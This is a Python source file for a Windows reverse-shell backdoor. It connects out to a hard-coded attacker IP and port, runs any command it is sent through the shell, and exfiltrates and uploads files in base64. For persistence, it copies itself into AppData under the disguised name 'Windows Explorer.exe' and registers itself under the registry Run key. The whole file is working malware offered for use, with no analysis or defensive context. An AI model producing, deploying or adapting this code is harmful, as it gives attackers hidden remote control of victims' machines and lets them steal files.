import socket
import subprocess
import os, sys, base64
import json
import shutil
class ReverseShell:
    def __init__(self, attacker_ip="192.168.31.135", attacker_port=4444):
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.format = 'utf-8'

    def become_persistence(self):
        evil_file_location = os.environ["appdata"]+"\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\currentVersion\\Run /v test REG_SZ /d "{evil_file_location}" /f', shell=True)
    def read_file(self, path):
        try:
            with open(path,"rb") as file:
                return base64.b64encode(file.read()).decode()
        except FileNotFoundError:
            return f"[-] file not found: {path}"
        except Exception as e:
            return f"[-] Error reading file: {e}"
    def write_file(self,path,content):
        with open(path,'wb')as file:
            file.write(base64.b64decode(content))
        return "[+] Uploaded successfully"
    def sending_data(self,data):
        if isinstance(data,bytes):
            data =base64.b64encode(data).decode(self.format)
        json_data = json.dumps(data)
        self.sock.send(json_data.encode(self.format))

    def receiving_data(self):
        json_data =""
        while True:
            try:
                json_data = json_data + self.sock.recv(1024).decode(self.format)
                return json.loads(json_data)
            except:
                continue

    def connect(self):
        """Connects to the attacker's machine and waits for commands."""
        try:
            self.sock.connect((self.attacker_ip, self.attacker_port))
            while True:
                command = self.receiving_data().split()
                if command in ["exit", "quit"]:
                    self.sock.close()
                    exit()
                    break
                output = self.run_command(command)
                self.sending_data(output)
        except Exception as e:
            print(f"Connection error: {e}")
        finally:
            self.sock.close()

    def run_command(self, command):
        """Executes received commands and returns the output."""
        try:
            if command[0] == "cd":
                try:
                    os.chdir(command[1])
                    output = f"Changed directory to {os.getcwd()}\n"
                except FileNotFoundError:
                    output = "Error: Directory not found.\n"
                except PermissionError:
                    output = "Error: Permission denied.\n"

            elif command[0] == "download":
                if len(command) > 1:
                    output = self.read_file(command[1])
                else:
                    output = "Error: No file specified for download."


            elif command[0] == "upload":
                if len(command) > 2:
                    output = self.write_file(command[1], command[2])
                else:
                    output = "Error: Invalid upload command format."

            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                except subprocess.CalledProcessError as e:
                    output = e.output
                except Exception as e:
                    output = f"Error executing command: {e}"

        except Exception as e:
            output = f"Unexpected error: {e}"

        return output  # ✅ Ensures function does NOT exit early


if __name__ == "__main__":
    shell = ReverseShell()
    shell.connect()
